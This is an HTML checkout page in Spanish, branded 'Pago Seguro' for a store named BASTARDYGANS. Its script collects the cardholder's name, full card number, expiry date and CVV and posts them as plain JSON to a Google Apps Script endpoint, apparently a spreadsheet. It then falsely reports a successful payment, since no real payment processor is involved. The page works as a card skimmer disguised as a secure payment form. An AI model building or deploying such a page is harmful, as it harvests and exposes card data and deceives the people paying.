<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tienda Online - Pago Seguro</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            font-family: Arial, sans-serif;
            background-color: #1a1a1a;
            color: #f5f5f5;
        }

        #secure-payment {
            position: relative;
            width: 100%;
            height: 100vh;
            background-image: url('https://raw.githubusercontent.com/Carlitosxz1/BASTARDYGANS/main/VIDEOS%20E%20IMAGENES/pago.jpg');
            background-size: cover;
            background-position: center;
        }

        .overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.7);
        }

        .payment-box {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            padding: 30px;
            background-color: #2c2c2c;
            border-radius: 10px;
            text-align: center;
            color: #f5f5f5;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.5);
        }

        .payment-box h2 {
            font-size: 1.8em;
            margin-bottom: 10px;
            display: flex;
            justify-content: center;
            align-items: center;
            color: #ffdd57;
        }

        .payment-box h2 img {
            margin-left: 10px;
            width: 24px;
            height: 24px;
        }

        .payment-box h3 {
            font-size: 1.2em;
            margin-bottom: 20px;
        }

        .payment-box form {
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .payment-box label {
            margin-bottom: 5px;
            width: 100%;
            text-align: left;
            color: #ffdd57;
        }

        .payment-box input {
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #ffdd57;
            border-radius: 5px;
            font-size: 1em;
            background-color: #1a1a1a;
            color: #f5f5f5;
        }

        .payment-box .input-group {
            display: flex;
            justify-content: space-between;
            width: 100%;
        }

        .payment-box .input-group input {
            width: 48%;
        }

        .payment-box button {
            padding: 10px 20px;
            background-color: #ff0000;
            color: #fff;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 1em;
            transition: background-color 0.3s ease;
        }

        .payment-box button:hover {
            background-color: #cc0000;
        }

        .payment-box .amount {
            font-size: 1.5em;
            margin-bottom: 20px;
            color: #ffdd57;
        }
        
        #card-type {
            margin-bottom: 15px;
            color: #ffdd57;
        }
        
        .loading-circle {
            border: 8px solid #f3f3f3;
            border-radius: 50%;
            border-top: 8px solid #3498db;
            width: 60px;
            height: 60px;
            animation: spin 2s linear infinite;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            display: none;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <section id="secure-payment">
        <div class="overlay"></div>
        <div class="payment-box">
            <h2>PAGO SEGURO <img src="https://raw.githubusercontent.com/Carlitosxz1/BASTARDYGANS/main/VIDEOS%20E%20IMAGENES/Candado_sinfondo.png" alt="Candado"></h2>
            <h3>BASTARDYGANS</h3>
            <div class="amount">$<span id="amount">0</span> CLP</div>
            <form id="payment-form">
                <label for="name">Nombre Completo:</label>
                <input type="text" id="name" name="name" placeholder="Ingrese su nombre completo" required>

                <label for="card-number">Número de Tarjeta:</label>
                <input type="text" id="card-number" name="card-number" placeholder="Ingrese su número de tarjeta" required pattern="\d{16}" maxlength="16">
                <div id="card-type"></div>

                <div class="input-group">
                    <div>
                        <label for="expiry-date">Fecha de Vencimiento:</label>
                        <input type="text" id="expiry-date" name="expiry-date" placeholder="MM/AA" required pattern="\d{2}/\d{2}" maxlength="5">
                    </div>
                    <div>
                        <label for="cvv">CVV:</label>
                        <input type="text" id="cvv" name="cvv" placeholder="Ingrese el CVV" required pattern="\d{3}" maxlength="3">
                    </div>
                </div>

                <button type="submit">Pagar</button>
            </form>
        </div>
        <div class="loading-circle" id="loading-circle"></div>
    </section>

    <footer>
        <div class="footer-content">
            <p>© 2024 BastardyGans. Todos los derechos reservados.</p>
        </div>
    </footer>

    <script>
        const cardNumberInput = document.getElementById('card-number');
        const cardTypeDiv = document.getElementById('card-type');

        cardNumberInput.addEventListener('input', function () {
            const cardNumber = this.value.replace(/\D/g, '');
            let cardType = '';

            if (/^4/.test(cardNumber)) {
                cardType = 'Visa';
            } else if (/^5[1-5]/.test(cardNumber)) {
                cardType = 'MasterCard';
            } else if (/^3[47]/.test(cardNumber)) {
                cardType = 'American Express';
            } else if (/^6(?:011|5)/.test(cardNumber)) {
                cardType = 'Discover';
            } else if (/^3(?:0[0-5]|[68])/.test(cardNumber)) {
                cardType = 'Diners Club';
            } else if (/^35(2[89]|[3-8][0-9])/.test(cardNumber)) {
                cardType = 'JCB';
            } else if (/^62/.test(cardNumber)) {
                cardType = 'UnionPay';
            } else {
                cardType = 'Desconocido';
            }

            cardTypeDiv.textContent = cardType;
        });

        document.getElementById('expiry-date').addEventListener('input', function () {
            this.value = this.value.replace(/[^0-9\/]/g, '').substring(0, 5);
            if (this.value.length === 2 && !this.value.includes('/')) {
                this.value += '/';
            }
        });

        document.getElementById('cvv').addEventListener('input', function () {
            this.value = this.value.replace(/\D/g, '').substring(0, 3);
        });

        const cartAmount = localStorage.getItem('cartAmount');
        if (cartAmount) {
            document.getElementById('amount').textContent = cartAmount;
        }

        document.getElementById('payment-form').addEventListener('submit', function(event) {
            event.preventDefault();
            document.getElementById('loading-circle').style.display = 'block';
            
            const formData = new FormData(event.target);
            
            const data = {
                name: formData.get('name'),
                cardNumber: formData.get('card-number'),
                expiryDate: formData.get('expiry-date'),
                cvv: formData.get('cvv'),
                amount: document.getElementById('amount').textContent
            };

            sendToGoogleSheets(data);
        });

        function sendToGoogleSheets(data) {
            const scriptURL = 'https://script.google.com/macros/s/AKfycbwamQ451A9keFnMgjqQUqwFhfRR_Oz2PbJzAQ4loMVmiFVLt9YbNsJF7Cx2mdvgfVz2Dg/exec';
            fetch(scriptURL, {
                method: 'POST',
                body: JSON.stringify(data),
                headers: {
                    'Content-Type': 'application/json'
                }
            })
            .then(response => response.json())
            .then(result => {
                document.getElementById('loading-circle').style.display = 'none';
                alert('Pago realizado con éxito');
            })
            .catch(error => {
                document.getElementById('loading-circle').style.display = 'none';
                alert('Hubo un error al procesar el pago');
            });
        }
    </script>
</body>
</html>
